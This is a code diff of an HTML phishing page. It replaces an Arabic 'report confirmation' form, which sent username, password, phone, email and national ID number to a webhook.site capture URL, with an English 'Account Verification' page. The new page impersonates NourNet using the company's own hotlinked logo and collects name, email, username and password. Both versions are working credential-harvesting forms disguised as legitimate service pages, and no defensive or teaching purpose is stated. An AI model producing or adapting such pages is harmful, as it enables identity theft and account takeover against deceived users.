@@ -1,102 +1,84 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
-  <meta charset="UTF-8" />
-  <title>تأكيد البلاغ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #e0f7f5;
-      margin: 0;
-      padding: 0;
-    }
-
-    .container {
-      max-width: 450px;
-      margin: 60px auto;
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-      text-align: right;
-    }
-
-    h2 {
-      color: #035c62;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-
-    label {
-      display: block;
-      margin-top: 15px;
-      color: #333;
-      font-weight: bold;
-    }
-
-    input[type="text"],
-    input[type="password"],
-    input[type="email"],
-    input[type="tel"],
-    input[type="number"] {
-      width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      box-sizing: border-box;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #009ca6;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      margin-top: 25px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #007c87;
-    }
-
-    .footer-note {
-      text-align: center;
-      font-size: 13px;
-      color: gray;
-      margin-top: 15px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NourNet Portal - Account Verification</title>
+    <style>
+        body {
+            font-family: 'Tahoma', sans-serif;
+            background: linear-gradient(to right, #005b9f, #1fa2ff);
+            color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            color: #005b9f;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0077cc;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005fa3;
+        }
+        .nournet-logo {
+            display: block;
+            margin: 0 auto 20px auto;
+            max-width: 150px;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h2>تأكيد بيانات البلاغ</h2>
-    <form action="https://webhook.site/07196fc2-e6cf-404a-9637-699e5153af56" method="POST">
-      <label for="username">اسم المستخدم</label>
-      <input type="text" id="username" name="username" required />
+    <div class="form-container">
+        <img src="https://eservices.nour.net.sa/images/logo2.png" alt="NourNet Logo" class="nournet-logo">
+        <h2>Account Information Verification</h2>
+        <form action="https://example.com/save" method="POST">
+            <label for="fullname">Full Name</label>
+            <input type="text" id="fullname" name="fullname" required>
 
-      <label for="password">كلمة المرور</label>
-      <input type="password" id="password" name="password" required />
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" required>
 
-      <label for="email">البريد الإلكتروني</label>
-      <input type="email" id="email" name="email" required />
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" required>
 
-      <label for="phone">رقم الجوال</label>
-      <input type="tel" id="phone" name="phone" required />
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
 
-      <label for="nid">رقم الهوية الوطنية</label>
-      <input type="text" id="nid" name="national_id" required />
-
-      <label for="ticket">رقم البلاغ</label>
-      <input type="text" id="ticket" name="ticket_id" required />
-
-      <button type="submit">تأكيد</button>
-    </form>
-    <p class="footer-note">جميع المعلومات ستُستخدم فقط لتأكيد البلاغ</p>
-  </div>
+            <button type="submit">Verify</button>
+        </form>
+    </div>
 </body>
 </html>
